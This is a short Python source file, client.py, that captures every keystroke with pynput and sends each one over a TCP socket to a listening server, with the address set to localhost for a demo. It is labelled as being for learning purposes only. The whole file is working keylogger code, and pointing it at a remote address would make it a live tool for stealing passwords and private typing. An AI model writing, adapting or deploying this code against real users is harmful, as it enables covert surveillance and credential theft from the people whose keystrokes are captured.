# client.py
# Captures keyboard input and sends it to server (for learning purposes only)

from pynput import keyboard
import socket

SERVER_IP = "127.0.0.1"   # Use localhost for demo
PORT = 9999

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER_IP, PORT))

def on_press(key):
    try:
        data = key.char
    except AttributeError:
        data = f"[{key}]"

    try:
        client.send(data.encode())
    except:
        pass

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
